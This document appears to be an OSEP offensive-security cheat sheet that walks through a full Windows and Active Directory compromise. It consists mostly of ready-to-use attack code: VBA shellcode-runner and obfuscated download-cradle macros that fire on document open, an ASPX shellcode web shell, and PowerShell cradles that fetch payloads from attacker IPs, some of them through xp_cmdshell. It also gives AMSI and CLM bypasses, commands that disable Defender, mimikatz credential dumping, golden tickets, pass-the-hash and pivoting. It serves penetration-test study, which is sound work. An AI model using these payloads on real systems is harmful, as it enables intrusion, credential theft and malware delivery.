# OSEP Exploitation Flow
## Common Commands
### Encode PowerShell payload

-  On Windows:
```powershell
[system.convert]::tobase64string([system.text.encoding]::unicode.getbytes('IEX ((new-object net.webclient).downloadstring("http://192.168.x.y/runner.txt"))'))
```
- On Linux:
```bash
echo -en 'IEX ((new-object net.webclient).downloadstring("http://192.168.x.y/runner.txt"))' | iconv -t UTF-16LE | base64 -w 0
```
### Save a ticket to file

- On Windows
```powershell
[System.IO.File]::WriteAllBytes("C:\windows\temp\bob.kirbi", [System.Convert]::FromBase64String("xxxxxx="))
```
- On linux
```bash
echo '…' | base64 -d > bob.kirbi
```
### List tickets

- Mimikatz
```powershell
sekurlsa::tickets
```
- Rubeus
```powershell
rubeus.exe triage
```
#### Operating System
```powershell
klist
```

### Export a ticket

- Mimikatz
```powershell
sekurlsa::tickets /export
```
- Rubeus
```powershell
rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap
```

### Import a ticket

- Mimikatz
```powershell
kerberos::ptt ticket.kirbi
```
- Rubeus
```powershell
rubeus.exe /ptt /ticket: [doIF…]
```

### Hash to Password

- NTLM
```bash
hashcat -a 0 -m 1000 hash.txt dict/rockyou.txt
```
- Net-NTLMv2
```bash
john --wordlist=dict/rockyou.txt hash.txt

hashcat -m 5600 hash.txt dict/rockyou.txt --force
```
- Kerberoasting
```bash
john --format=krb5tgs --wordlist=dict/rockyou.txt hash.txt
```
- ASREPRoasting
```bash
hashcat -a 0 -m 18200 hash.txt dict/rockyou.txt

john --format=krb5asrep --wordlist=dict/rockyou.txt hash.txt
```

### Password to Hash
```powershell
rubeus.exe hash /domain:red.com /user:rbcd$ /password:123
```

### Use of ticket

- Mimikatz
```powershell
kerberos::ptt ticket.kirbi
```
- Rubeus:
```powershell
rubeus.exe /ptt /ticket: [doIF…]
```

### Use of hash

- Mimikatz
```powershell
sekurlsa::pth /user:admin /domain:blue /ntlm:2892D26CDF84D7A70E2EB3B9F05C425E /run:"mstsc.exe /restrictedadmin"
```
- Evil-WinRM
```bash
evil-winrm -i 192.168.10.10 -u alice -H [hash]
```
- Xfreerdp
```bash
xfreerdp /v:192.168.10.10 /u:alice /pth:[hash] /d:red.com /dynamic-resolution
```

### SID and Name

- SID to Name
```powershell
convertfrom-sid S-1-5-21-3776646582-2086779273-4091361643-1601
```
- Name to SID:
```powershell
Get-DomainSID -Domain child.red.com
```

## C2 Preparations
### Metasploit
```bash
msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST 192.168.x.y; set LPORT 443; set ExitOnSession false; run -zj"
```

## Initial Compromise
### Word Macro
- VBA Shellcode Runner (x86)
```vba
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr

Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr

Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr

Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long

Private Declare PtrSafe Function FlsAlloc Lib "KERNEL32" (ByVal callback As LongPtr) As LongPtr

Function mymacro()

Dim allocRes As LongPtr

Dim buf As Variant

Dim addr As LongPtr

Dim counter As Long

Dim data As Long

Dim res As Long

Dim t1 As Date

Dim t2 As Date

Dim time As Long

allocRes = FlsAlloc(0)

If IsNull(allocRes) Then

End

End If

t1 = Now()

Sleep (2000)

t2 = Now()

time = DateDiff("s", t1, t2)

If time < 2 Then

Exit Function

End If

buf = Array(...)

For i = 0 To UBound(buf)

buf(i) = buf(i) Xor 188

Next i

addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)

For counter = LBound(buf) To UBound(buf)

data = buf(counter)

res = RtlMoveMemory(addr + counter, data, 1)

Next counter

res = CreateThread(0, 0, addr, 0, 0, 0)

End Function

Sub Document_Open()

mymacro

End Sub

Sub AutoOpen()

mymacro

End Sub
```
- VBA PowerShell Download Cradle
```vba
Function MyMacro()

Dim Apples As String

Dim Water As String

If ActiveDocument.Name <> Nuts("...") Then

Exit Function

End If

Apples = "..."

Water = Nuts(Apples)

GetObject(Nuts("...")).Get(Nuts("...")).Create Water, Tea, Coffee, Napkin

End Function

Function Pears(Beets)

Pears = Chr(Beets Xor 188)

End Function

Function Strawberries(Grapes)

Strawberries = Left(Grapes, 3)

End Function

Function Almonds(Jelly)

Almonds = Right(Jelly, Len(Jelly) - 3)

End Function

Function Nuts(Milk)

Do

Oatmilk = Oatmilk + Pears(Strawberries(Milk))

Milk = Almonds(Milk)

Loop While Len(Milk) > 0

Nuts = Oatmilk

End Function

Sub Document_Open()

MyMacro

End Sub

Sub AutoOpen()

MyMacro

End Sub
```

### Phishing
- HTA
- Web Shell
```csharp
<%@ Page Language="C#" AutoEventWireup="true" %>

<%@ Import Namespace="System.IO" %>

<%@ Import Namespace="System.Diagnostics" %>

<%@ Import Namespace="System.Runtime.InteropServices" %>

<%@ Import Namespace="System.Net" %>

<%@ Import Namespace="System.Text" %>

<%@ Import Namespace="System.Threading" %>

<script runat="server">

[System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true)]

public static extern IntPtr GetCurrentProcess();

[System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]

static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress,

uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

[System.Runtime.InteropServices.DllImport("kernel32.dll")]

static extern void Sleep(uint dwMilliseconds);

[System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]

static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,

uint flAllocationType, uint flProtect);

[System.Runtime.InteropServices.DllImport("kernel32.dll")]

static extern IntPtr CreateThread(IntPtr lpThreadAttributes,

uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,

uint dwCreationFlags, IntPtr lpThreadId);

[System.Runtime.InteropServices.DllImport("kernel32.dll")]

static extern UInt32 WaitForSingleObject(IntPtr hHandle,

UInt32 dwMilliseconds);

protected void Page_Load(object sender, EventArgs e)

{

byte[] buf = new byte[642] {0x40, ...};

byte[] dec = new byte[buf.Length];

for (int i = 0; i < buf.Length; i++)

{

dec[i] = (byte)((uint)buf[i] ^ 0xbc);

}

DateTime t1 = DateTime.Now;

Sleep(2000);

double t2 = DateTime.Now.Subtract(t1).TotalSeconds;

if (t2 < 1.5)

{

return;

}

IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);

if (mem == null)

{

return;

}

IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

Marshal.Copy(dec, 0, addr, dec.Length);

IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr,IntPtr.Zero, 0, IntPtr.Zero);

WaitForSingleObject(hThread, 0xFFFFFFFF);

}

</script>
```

### Code Execution
- Cmd
```powershell
powershell -exec bypass iex (new-object net.webclient).downloadstring('http://192.168.x.y/run.txt')
```

## Local Reconnaissance On Linux
### Bash History

- Check current user's bash history

- Check every user's bash history after escalating to root

### SSH Key

- id_rsa

Could in other name such as **bob.key**

/home/bob/.ssh/id_rsa could be alice's private key

known_host (Which you can access)

Servers that current user's private key can access. Could be hashed

- authorized_key

Clients have been connected to this server as current user

### Credential in config/text files

- Config file of web app

- Credential reuse

### Database

- Stored Credential in table

- Credential reuse

### sudo -l

- GTFOBins

### suid

- GTFOBins

### SSH control master

A ->B: A has a session on B, piggybacking A's access to B
```
~/.ssh/config or /etc/ssh/ssh_config
```

Any socket file like kevin@web03:22 in `/home/kevin/.ssh/controlmaster`

`ssh kevin@web03`

If logged in as root

`ssh -S /home/alice/.ssh/controlmaster\@alice@web03\:22 alice@web03`

### SSH Agent Forwarding

A -> B -> C: A has a session on B, and A's private key can access to both B and C

On B to access C

Normal user
```
ssh alice@web03
```
Privileged User
```
SSH_AUTH_SOCK=/tmp/ssh-xxx ssh-add -l

SSH_AUTH_SOCK=/tmp/ssh-xxx ssh alice@web03
```
### ccache file

- Contain request Kerberos tickets
```bash
/tmp/krb5cc_jack
```
- Convert ccache to kirbi file
```bash
export KRB5CCNAME=/tmp/krb5cc_george
```
### /etc/krb5.keytab

- Can be used for Kerberos authentication

### keytab file

- Contain Kerberos principle name and encrypted keys
```bash
/tmp/alice.keytab

/etc/crontab

kinit alice@red.com -k -t /tmp/alice.keytab
```
### pspy

- Hidden cronjobs (Could contain credentials)

### /opt/pbis

- Enumerate domain on Linux

- Make use of keytab and ccache file

### Ansiblebook

Node hosts: `/etc/ansible/hosts`

Playbook

Execute commands on node servers

Retrieve credentials of node servers from playbook
```bash
python3 /usr/share/john/ansible2john.py web.yaml

hashcat hash.txt --force --hash-type=16900 dict/rockyou.txt

cat pw.txt | ansible-vault decrypt
```
Sensitive data

Playbook contains a command, the command contains plaintext credential. Like mysql.yml

/var/log/syslog

### Jfrog

Binary Repository Manager

Port 8082
```
ps aux | grep artifactory
```
- Check existing files and user interactions like creation, download, etc.

- Delivery malicious file (With user interaction)

- Database backup contains credential: ```/opt/jfrog/artifactory/var/backup/access```

- Compromise database

## Local Reconnaissance On Windows
### CLM

- Check CLM
```powershell
$ExecutionContext.SessionState.LanguageMode
```
- Bypass CLM
```powershell
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U "C:\Windows\Tasks\clm.exe"
```
### AMSI

- Check AMSI
```powershell
'amsiutils'
```
- Disable AMSI
```powershell
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Failed") {$f=$e}};$f.SetValue($null,$true)
```
### Enumerate Domain
```powershell
iex (new-object net.webclient).downloadstring("http://192.168.x.y/tools/sharphound.ps1")
Invoke-BloodHound -CollectionMethod All -Verbose

SharpHound.exe -c All,GPOLocalGroup,LoggedOn --domain final.com --ldapusername nina --ldappassword 'PasswordRulon123!'

ipmo .\adpeas.ps1
Invoke-adPEAS
```
### LAPS

- Check LAPS
```powershell
iex(new-object system.net.webclient).downloadstring('http://192.168.x.y/tools/hostrecon.ps1')
invoke-hostrecon
```
- Read Password
```powershell
Get-ADObject -Name web05 -DomainController 192.168.y.z -Properties ms-mcs-admpwd
```
### AppLocker

- Check AppLocker
```powershell
Get-ChildItem -Path HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2\Exe
```
- Bypass AppLocker

### PPL

- Check PPL
```powershell
Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name "RunAsPPL"
```
- Remove PPL
```cmd
mimikatz.exe "privilege::debug" "!+" "!processprotect /process:lsass.exe  /remove" "sekurlsa::logonpasswords"exit
```
### Shutdown AV and Firewall

- In PowerShell
```powershell
Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true

netsh advfirewall set allprofiles state off
```
- In RDP

Manually shut down WD.

### Local Enumeration

- whoami /priv

- Files and Directorys
```
C:\program files\

C:\program files (x86)\

C:\users\bob\document

C:\users\bob\desktop

C:\users\bob\.ssh

C:\program Files\setup\mail.ps1

C:\inetpub\wwwroot\login.aspx (If web app uses MSSQL)
```
- Local Session

Available tokens of other users/services

- Vulnerable Service
```powershell
ipmo .\powerup.ps1

invoke-allchecks

sc qc vuln

sc config vuln start demand  //Change start type

sc config vuln obj "NT AUTHORITY\SYSTEM"  //Change owner

Invoke-serviceabuse -name 'vuln' -username 'red\alice'  //Abuse
```

### SQL Server Instance

- Instance
```powershell
get-sqlinstancelocal

get-sqlinstancedomain

Get-SQLConnectionTest -Instance "srv-1.red.com,1433"
```
- Server Info
```powershell
get-sqlserverinfo -instance "redsql\sqlexpress"
```
- Privilege Enumeration

Sysadmin logins/users
```powershell
Get-SQLQuery -Instance 'red.com,1433' -query "select name from master..syslogins where sysadmin=1;"
```
User/Login can be impersonated
```powershell
Get-SQLQuery -Instance 'red.com,1433' -query "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';"
```
- Linked Servers

Not all users can see all links
```powershell
select * from master..sysservers; (SQL Query)

exec sp_linkedservers; (SQL Query)

get-sqlserverlinkcrawl -instance "cywebdw\sqlexpress" -username webapp11 -password 89543dfGDFGH4d (PowerUpSQL Query)

get-sqlquery -instance "CYWEBDW\SQLEXPRESS" -query "select * from openquery(""m3sqlw.red.local"",'select * from master..sysservers')" (PowerUpSQL Open Query)
```
- Value of xp_cmdshell
```powershell
select * from sys.configurations where name='xp_cmdshell' (SQL Query)

get-sqlquery -instance "CYWEBDW\SQLEXPRESS" -query "select * from sys.configurations where name ='xp_cmdshell'" (PowerUpSQL Query)

get-sqlquery -instance "CYWEBDW\SQLEXPRESS" -query "select * from openquery (""m3sqlw.red.local"",'select * from sys.configurations where name=''xp_cmdshell''')" (PowerUpSQL OpenQuery)
```
- Enable xp_cmdshell
```powershell
EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

exec xp_cmdshell 'whoami'; (SQL Query)

get-sqlquery -instance "CYWEBDW\SQLEXPRESS" -query "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;EXEC master.dbo.xp_cmdshell 'whoami';"  (PowerUpSQL Query)

get-sqlquery -instance "web06\sqlexpress" -query "exec ('sp_configure ''show advanced options'', 1; reconfigure; exec sp_configure ''xp_cmdshell'', 1; reconfigure;') AT sql03; exec('xp_cmdshell ''hostname'';') at SQL03" -username sa -password Passw0rd  (1 hop PowerUpSQL Query)
```
- xp_cmdshell Meterpreter Shell
```bash
echo -en 'IEX ((new-object net.webclient).downloadstring("http://10.10.14.111/runner64.txt"))' | iconv -t UTF-16LE | base64 -w 0 (Encode Payload)

exec xp_cmdshell 'powershell -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgAxADEAMQAvAHIAdQBuAG4AZQByADYANAAuAHQAeAB0ACIAKQApAA==' (SQL Query)

Invoke-SQLOSCmd -Instance "CYWEBDW\SQLEXPRESS" -Command "powershell -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgAxADEAMQAvAHIAdQBuAG4AZQByADYANAAuAHQAeAB0ACIAKQApAA== " -RawResults  (PowerUpSQL Query 1)

get-sqlquery -instance "CYWEBDW\SQLEXPRESS" -query "EXEC('xp_cmdshell ''powershell -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgAxADEAMQAvAHIAdQBuAG4AZQByADYANAAuAHQAeAB0ACIAKQApAA== '' ; ' ) " (PowerUpSQL Query 2)

get-sqlquery -instance "CYWEBDW\SQLEXPRESS" -query "EXEC('xp_cmdshell ''powershell -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgAxADEAMQAvAHIAdQBuAG4AZQByADYANAAuAHQAeAB0ACIAKQApAA== '' ; ' )AT [m3sqlw.red.local]" (1 hop PowerUpSQL query)
````
- Enable rpcout
```sql
execute as login='sa'; exec sp_serveroption 'sql03', 'rpc out', 'true'; (SQL Query)

get-sqlquery -instance "cywebdb\sqlexpress" -query "execute as login ='sa'; exec sp_serveroption 'm3sqlw.red.local', 'rpc out', 'true'" (PowerUpSQL Query)

get-sqlquery -instance "cywebdb\sqlexpress" -query "execute as login ='sa'; exec (sp_serveroption 'm3sqlw.red.local', 'rpc out', 'true') at [m3sqlw.red.local]" (PowerUpSQL Open Query)
```
### Privilege Escalation is not necessary to be done immediately

DA or some specific domain users have admin privilege to current host

### Password/Hash reuse

Similar machines could share the same password/hash

SQL01 and SQL02

SQL01 and File01

## Domain Reconnaissance on Kali
### BloodHound
```bash
proxychains bloodhound-python -c ALL -u kevin -p 'Passw0rd' -d red.com -dc dc.red.com -ns 10.9.20.10 --dns-tcp
```
or
```bash
proxychains bloodhound-python3 -c ALL -u 'WEB05$@RED.COM' --hashes 00000000000000000000000000000000:d66f37fd3d677522959e5b4aeecafb78 -d COMPLYEDGE.COM  -ns 172.16.76.168 --dns-tcp (Extract NTLM from /etc/krb5cc.keytab)
```
### SMB Access
```bash
smbmap -H 10.9.20.10 -u kevin -p Passw0rd
```
### WinRM Access
```bash
crackmapexec winrm 10.9.20.10 -u kevin -p 'Password'
```
### SMB Signing
```bash
crackmapexec smb 10.9.20.10
```
### User

- RPCClient
```bash
proxychains rpcclient -U red.com/kevin.gustavo%Passw0rd 10.9.20.10

enumdomusers

queryuser 0x3601
```
-  Impacket
```bash
proxychains python3 GetADUsers.py -all -k -no-pass -dc-ip 10.9.20.10 red.com/Administrator
```
### Group

- RPCClient
```bash
enumdomgroups

querygroup 0x200
```

### ASREPoasting
```bash
python3 impacket/example/GetUserSPNs.py red.com/ -no-pass -dc-ip 10.9.20.10 -userfile users.txt /fomat:hashcat
```
### Kerberoasting
```bash
python3 impacket/example/GetNPUsers.py red.com/kevin:Passw0rd  -dc-ip 10.9.20.10
```
### Overpass the Hash/PTK
```bash
python3 impacket/example/getTGT.py red.com/kevin:Passw0rd
```

### Reset AD Password

- RPCClient
```bash
setuserinfo2 lawrencecohen 23 'Passw0rd'
```
## Domain Reconnaissance on Windows
### GPO

Check GPOs which enable group of users to have remote access (PsExec, WMI, WinRM, RDP, etc) to specific hosts.

### Kerberoasting
```powershell
rubeus.exe kerberoast /user:svc_sql /nowrap
```
### ASREPRoasting
```powershell
rubeus.exe asreproast /format:hashcat /user:svc_sql /nowrap
```
### Unconstrained Delegation
```powershell
rubeus.exe monitor /interval:1 /filtuser:reddc$ /nowrap

Spoolsample.exe reddc redsqlw

rubeus.exe ptt /ticket:[ticket]

mimikatz # lsadump::dcsync /domain:red.com /user:RED\administrator
```
### Constrained Delegation
```powershell
rubeus.exe tgtdeleg /nowrap

rubeus.exe s4u /impersonate:kevin /user:svc_sql /domain:red.local /msdsspn:time/redwebaw.red.com /altservice:cifs,host,http,winrm /ticket:[ticket] /dc:reddc.red.com /ptt
```
### Resource Based Constrained Delegation
```powershell
ipmo .\powermad.ps1

New-MachineAccount -MachineAccount my -Password $(ConvertTo-SecureString '123' -AsPlainText -Force)

ipmo .\Microsoft.ActiveDirectory.Management.dll

Set-ADComputer red09 -PrincipalsAllowedToDelegateToAccount my$ -Server [DC IP] -Verbose

rubeus.exe s4u /user:my$ /rc4:…… /impersonateuser:administrator /msdsspn:CIFS/red09.red.com /ptt
```
### Internal Web Service

If it is not accessible directly, use SOCKS to access it.

Any computer/users' name contain "web", "svc", etc.

Send a phishing email

Send a document

Execute command

Ping a host

DevOps


### SQL Server

- Administrative Logins and Users

sa: Instance Level

dbo: Database level

- Database
```sql
select name from master..sysdatabases;
```
- Tables
```sql
SELECT name FROM master..sysobjects WHERE xtype = ‘U’;
```
- Column
```sql
select name from syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'users')
```
- User/login
```sql
select user_name(); //Server Login Name

select system_user; //Database User Name

select * from master..syslogins;
```
- Change Password
```sql
ALTER LOGIN webapp  WITH PASSWORD = 'Passw0rd';
```
- SQL Admin
```sql
SELECT IS_SRVROLEMEMBER('sysadmin')

SELECT NAME from master..syslogins where SYSADMIN=1;
```
- Login can be impersonated
```sql
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';
```
- Impersonate Sysadmin
```sql
EXECUTE AS LOGIN='sa';

use msdb; EXECUTE AS USER='dbo';
```
- Create a new Sysadmin
```sql
exec ('exec sp_addlogin "zys","Passw0rd"') at [sql01];

exec ('exec sp_addsrvrolemember "zys","sysadmin"') at [sql01];
```

- Check link
```sql
select * from master..sysservers;

exec sp_linkedservers
```
- UNC Path Injection

```bash
proxychains python3 impacket/examples/ntlmrelayx.py  --no-http-server -smb2support -t 172.16.221.152 -c

EXEC xp_dirtree '\\192.168.x.y\pwn', 1, 1

proxychains python3 impacket/examples/psexec.py -hashes :a7a662ffa4744b6393261529aa5004ad administrator@172.16.y.z

EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC master.dbo.xp_cmdshell 'whoami';
```
- Command Execution

EXEC
```sql
EXEC master.dbo.xp_cmdshell 'whoami';
```
Openquery (Blind)
```sql
Select * From openquery("reddc", 'select @@servername; exec xp_cmdshell ''ping 192.168.x.y'' ');
```

Check Rpcout
```sql
select srvid,srvname,rpcout from master..sysservers;
```
Enable Rpcout
```sql
exec sp_serveroption 'sql03', 'rpc out', 'true';
```
### Bidirectional Trust Within a Forest

```powershell
mimikatz.exe

lsadump::dcsync /domain:ops.comply.com /user:ops\krbtgt

Get-DomainSID -Domain ops.red.com

Get-DomainSID -Domain red.com

mimikatz.exe "kerberos::golden /user:Administrator /domain:ops.red.com /sid:S-1-5-21-2032401531-514583578-4118054891 /krbtgt:7c7865e6e30e54e8845aad091b0ff447 /sids:S-1-5-21-1135011135-3178090508-3151492220-519 /ptt" "exit"
```

### Abuse Trust key in bidirectional trust
```powershell
lsadump::dcsync /domain:child.red.com /user:red$

mimikatz kerberos::golden /user:Administrator /domain:child.red.com /sid:S-1-5-21-1675743924-53933031-1918224021 /rc4:51d5b5713a4732047319d02bb9c07c10 /sids:S-1-5-21-3192643952-2658629199-322554960-519 /service:krbtgt /target:red.com /ticket:trust.kirbi

rubeus.exe asktgs /ticket:trust.kirbi /service:cifs/reddc.red.com /dc:reddc.red.com /ptt

ls \\reddc.red.com\c$
```
### Inbound Trust

```powershell
dcsync red.com red\administrator

rubeus.exe asktgt /user:administrator /domain:red.com/aes256:b3d86eabd4895b6cc1ba459490445e0444053c7f24e0ed50cf86d1e1154576c9 /opsec /nowrap

rubeus.exe asktgs /service:krbtgt/blue.com /domain:red.com /dc:reddc.red/com /ticket:[ticket] /nowrap

rubeus.exe asktgs /service:cifs/bluedc.blue.com/domain:bluedc.blue.com /dc:bluedc.blue.com /ticket:[ticket]  /nowrap

echo '[ticket]' | grep base64 -d > red.kirbi

ls [\\bluedc.blue.com\c$](file://bluedc.blue.com/c$)
```
### Bidirectional Trust Between Forests

```powershell
mimikatz.exe

lsadump::dcsync /domain:red.com /user:RED\krbtgt

Get-DomainSID -Domain red.com

Get-DomainSID -Domain redteam.com

netdom trust redteam.com /d:red.com /enablesidhistory:yes

Get-DomainGroupMember -Identity "Administrators" -Domain redteam.com

mimikatz.exe "kerberos::golden /user:Administrator /domain:redteam.com /sid:S-1-5-21-2032401531-514583578-4118054891 /krbtgt:7c7865e6e30e54e8845aad091b0ff447 /sids:S-1-5-21-1135011135-3178090508-3151492220-1106 /ptt" "exit"
```

## Credentials
### From File
```powershell
C:\program files\xxx\mail.ps1

C:\inetpub\wwwroot\loginform.aspx
```
### Dcsync
```
mimikatz.exe "privilege::debug" "!+" "!processprotect /process:lsass.exe  /remove" "lsadump::dcsync /domain:red.com /user:red\Administrator"exit
```
### logonpasswords
```
mimikatz.exe "privilege::debug" "!+" "!processprotect /process:lsass.exe  /remove" "sekurlsa::logonpasswords"exit
```
### SAM
```
mimikatz.exe "privilege::debug" "!+" "!processprotect /process:lsass.exe  /remove" "token::elevate" "lsadump::sam"exit
```
### Secret
```
mimikatz.exe "privilege::debug" "!+" "!processprotect /process:lsass.exe  /remove" "token::elevate" "lsadump::secrets"exit
```
### DPAPI
```
mimikatz.exe "privilege::debug" "!+" "!processprotect /process:lsass.exe  /remove" "sekurlsa::dpapi"exit
```
### SSH Key

- id_rsa: Could be other user's.

- authorized_keys

- known_hosts

### Ansible
```
/opt/web.yml
```
### Jfrog

### ccache
```
/tmp/krb5cc_alice
```
### keytab

/etc/krb5.keytab

## Remote Access
### PsExec64

- Local SYSTEM
```powershell
paexec.exe -s -i cmd
```
- Remote Login
```powershell
paexec.exe -s [\\reddc.red.com](file://reddc.red.com) powershell
```

### psexec
```bash
python3 impacket/examples/psexec.py -hashes :052e763020c5da81d4085a05e69b0f1b [RED/]pete@192.168.y.z

python3 impacket/example/psexec.py -k -no-pass da@reddc.red.com cmd
```
### WinRM

```
evil-winrm -i 172.16.y.z -u [red.com\\]jim -p Passw0rd

evil-winrm -i 192.168.y.z -u kevin -H [hash]

invoke-command -computername redwebaw.red.com -scriptblock {cmd /c "powershell -exec  bypass -nop iex (new-object net.webclient).downloadstring('http://192.168.x.y/runner64.txt')"}
```

### RDP

- Password Authentication
```
xfreerdp /u:Administrator /p:lab [/d:red.com] /cert:ignore  //v:192.168.y.z/dynamic-resolution
```
- PTH
```
New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin -Value 0

xfreerdp /v:192.168.y.z /u:bill /pth:[hash] /d:red.com /dynamic-resolution
```

### SSH
```bash
ssh kevin@192.168.y.z
```
## Pass the Hash

### Mimikatz
```powershell
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:kevin /domain:red.local /ntlm:09238831b1af5edab93c773f56409d96" exit
```
### PsExec
```bash
python3 impacket/examples/psexec.py -hashes :052e763020c5da81d4085a05e69b0f1b [red/]pete@172.16.90.151
```
### WinRM
```powershell
evil-winrm -i 192.168.10.10 -u [red\\]kevin -H 052e763020c5da81d4085a05e69b0f1b
```
### WMI
```bash
python3 impacket/examples/wmiexec.py -k --no-pass [red/]zys@10.9.20.10
```
### SQL
```bash
python3 impacket/examples/mssqlclient.py -p 1433  -windows-auth red/svc_sql@10.10.20.9 -hashes :052e763020c5da81d4085a05e69b0f1b
```
### RDP
```
New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin -Value 0

xfreerdp /v:192.168.10.10 /u:user /pth:[hash] /d:corp1.com /dynamic-resolution
```
or
```powershell
mimikatz.exe

privilege::debug

sekurlsa::pth /user:kevin /domain:red.local /ntlm:2892D26CDF84D7A70E2EB3B9F05C425E /run:"mstsc.exe /restrictedadmin"
```
## PTK and PTT

### Preparation

Passed the ticket or ccache.


### PsExec
```
python3 impacket/example/psexec.py -k -no-pass thomas@dc.red.local cmd
```
### WinRM
```
invoke-command -computername m3webaw.red.local -scriptblock {cmd /c "powershell -ep bypass iex (new-object net.webclient).downloadstring('http://10.10.14.111/run.txt')"}
```
### WMI
```
python3 impacket/examples/wmiexec.py -k --no-pass [red/]alice@10.9.20.10
```
### SQL
```
python3 impacket/examples/mssqlclient.py -p 1433  -windows-auth red/svc_sql@10.10.20.9 -k -no-pass
```
## Pivoting
### Socks

- Metasploit
```bash
use socks_proxy

set srvhost 127.0.0.1

run

use autoroute

set session 1

run
```
- SSH
```bash
ssh root@192.168.90.101 -D 1080
```
- Chisel

```bash
chisel server -p 8080 --reverse

chisel.exe client 10.10.14.91:8080 R:socks
```
- Exploit a vulnerability through SOCKS
```bash
set lhost 10.10.14.91

set rhost 10.9.15.11

set lport 8443

set proxies socks5:127.0.0.1:1080

set payload ……

set reverseallowproxy true

run
```

### SSHuttle
```bash
sshuttle -r bob@172.16.90.197 172.16.90.1/24
```
